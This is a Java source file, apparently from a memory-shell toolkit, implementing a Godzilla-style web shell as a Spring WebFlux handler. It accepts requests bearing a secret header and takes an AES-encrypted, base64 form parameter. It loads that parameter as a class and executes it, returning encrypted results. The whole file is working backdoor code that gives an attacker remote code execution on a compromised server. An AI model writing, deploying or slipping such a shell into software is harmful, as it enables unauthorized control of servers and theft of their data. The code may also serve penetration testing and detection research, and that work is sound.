package com.reajason.javaweb.memshell.springwebflux.godzilla;

import org.springframework.http.ResponseEntity;
import org.springframework.web.server.ServerWebExchange;
import reactor.core.publisher.Mono;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class GodzillaHandlerMethod extends ClassLoader {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;
    public Class<?> payload;

    public GodzillaHandlerMethod() {
    }

    public GodzillaHandlerMethod(ClassLoader parent) {
        super(parent);
    }

    public ResponseEntity<?> invoke(ServerWebExchange exchange) {
        String value = exchange.getRequest().getHeaders().getFirst(headerName);
        if (value == null || !value.contains(headerValue)) {
            return ResponseEntity.notFound().build();
        }
        try {
            Object bufferStream = exchange.getFormData().flatMap(map -> {
                StringBuilder result = new StringBuilder();
                try {
                    byte[] data = base64Decode(map.getFirst(pass));
                    data = x(data, false);
                    if (payload == null) {
                        payload = new GodzillaHandlerMethod(Thread.currentThread().getContextClassLoader()).defineClass(null, data, 0, data.length);
                    } else {
                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                        Object f = payload.getDeclaredConstructor().newInstance();
                        f.equals(arrOut);
                        f.equals(data);
                        f.equals(exchange.getRequest());
                        result.append(md5.substring(0, 16));
                        f.toString();
                        result.append(base64Encode(x(arrOut.toByteArray(), true)));
                        result.append(md5.substring(16));
                    }
                } catch (Exception ex) {
                    result.append(ex.getMessage());
                }
                return Mono.just(result.toString());
            });
            return ResponseEntity.ok(bufferStream);
        } catch (Exception ex) {
            return ResponseEntity.ok(ex.getMessage());
        }
    }


    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = base64.newInstance();
                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    public byte[] x(byte[] s, boolean m) {
        try {

            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }
}
